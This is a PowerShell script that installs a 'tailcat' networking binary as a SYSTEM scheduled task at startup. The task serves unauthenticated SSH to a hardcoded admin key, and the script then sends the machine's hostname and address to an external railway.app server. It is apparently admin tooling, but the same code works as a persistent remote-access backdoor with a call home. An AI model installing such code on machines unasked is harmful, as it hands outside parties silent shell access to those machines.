param(
    [string]$Directory = "$env:ProgramData\Tailcat",
    [string]$TaskName = 'Tailcat SSH'
)

$ErrorActionPreference = 'Stop'
$admin = 'nodekey:1168236a8fd1d12a98156b0c08626cc33bcf0892fd4620b06e8ddd7b3f4e0d42'
$principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { throw 'Run PowerShell as Administrator.' }
if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {

New-Item -ItemType Directory -Path $Directory -Force | Out-Null
$acl = New-Object Security.AccessControl.DirectorySecurity
$acl.SetAccessRuleProtection($true, $false)
$acl.SetOwner([Security.Principal.SecurityIdentifier]'S-1-5-32-544')
foreach ($sid in 'S-1-5-18', 'S-1-5-32-544') {
    $acl.AddAccessRule([Security.AccessControl.FileSystemAccessRule]::new([Security.Principal.SecurityIdentifier]$sid, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'))
}
Set-Acl -LiteralPath $Directory -AclObject $acl

$zip = Join-Path $Directory 'tailcat.zip'
Invoke-WebRequest 'https://github.com/tailscale/tailcat/releases/download/v0.7.0/tailcat_0.7.0_windows_amd64.zip' -UseBasicParsing -OutFile $zip
if ((Get-FileHash $zip -Algorithm SHA256).Hash -ne 'F04CAC07E3BF6C700B0B543DF0D3315A3B312CD5A05EE76714E1CC848E9B2DFF') { throw 'Tailcat download checksum mismatch.' }
Expand-Archive -LiteralPath $zip -DestinationPath $Directory -Force
Remove-Item -LiteralPath $zip

$exe = Join-Path $Directory 'tailcat.exe'
$key = Join-Path $Directory 'server.private.json'
$addressFile = Join-Path $Directory 'address.txt'
if (-not (Test-Path -LiteralPath $key)) {
    $process = Start-Process $exe -ArgumentList @('genkey', "--key=`"$key`"", '--region=fra') -NoNewWindow -Wait -PassThru -RedirectStandardOutput $addressFile -RedirectStandardError (Join-Path $Directory 'setup.log')
    if ($process.ExitCode -ne 0) { throw 'Tailcat key generation failed; see setup.log.' }
}
$address = (Get-Content -LiteralPath $addressFile -Raw).Trim()
if ($address -notmatch '^tc[A-Za-z0-9_-]+$') { throw 'Missing or invalid Tailcat address.' }

@'
$ErrorActionPreference = 'Stop'
$env:APPDATA = "$PSScriptRoot\config"
$process = Start-Process "$PSScriptRoot\tailcat.exe" -ArgumentList @('serve', "--key=`"$PSScriptRoot\server.private.json`"", '--allow=ADMIN_KEY', 'no-auth-ssh') -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$PSScriptRoot\stdout.log" -RedirectStandardError "$PSScriptRoot\stderr.log"
exit $process.ExitCode
'@.Replace('ADMIN_KEY', $admin) | Set-Content -LiteralPath (Join-Path $Directory 'run.ps1') -Encoding ASCII

$shell = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
$action = New-ScheduledTaskAction -Execute $shell -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$Directory\run.ps1`""
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $TaskName -User SYSTEM -RunLevel Highest -Action $action -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings $settings | Out-Null
Start-ScheduledTask -TaskName $TaskName
}
$address = (Get-Content -LiteralPath (Join-Path $Directory 'address.txt') -Raw).Trim()
$body = @{ hostname = $env:COMPUTERNAME; address = $address } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod 'https://dev-master.up.railway.app/register' -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 15 | Out-Null
    Write-Output 'SSH installed. Address sent to the Linux server.'
} catch { Write-Warning "SSH installed; address report failed: $($_.Exception.Message)" }
